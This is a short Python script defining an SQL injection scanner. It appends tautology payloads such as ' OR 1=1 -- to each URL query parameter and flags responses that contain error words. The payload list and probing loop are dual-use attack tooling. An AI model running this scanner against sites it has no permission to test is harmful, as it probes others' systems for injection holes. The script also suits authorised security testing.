import requests
from termcolor import colored
from urllib.parse import quote, urlparse, urlunparse, parse_qs, urlencode

def scan_sqli(url):
    print(colored(f"Scanning for SQLi vulnerabilities on {url}", "blue"))
    sqli_payloads = [
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR 1=1; --",
        '" OR 1=1 --',
        '" OR "1"="1" --',
    ]
    vulnerabilities = []

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in list(query_params.keys()):
        original_value = query_params[param][0]
        for payload in sqli_payloads:
            query_params[param] = original_value + payload
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            try:
                response = requests.get(test_url)
                if "error" in response.text.lower() or "syntax" in response.text.lower() or "unclosed" in response.text.lower():
                    vulnerabilities.append({
                        "type": "SQLi",
                        "url": test_url,
                        "payload": payload
                    })
                    print(colored(f"  [+] SQLi vulnerability found at {test_url} with payload: {payload}", "red"))
            except Exception as e:
                print(colored(f"  [-] Error testing for SQLi at {test_url}: {e}", "yellow"))
        query_params[param] = original_value

    return vulnerabilities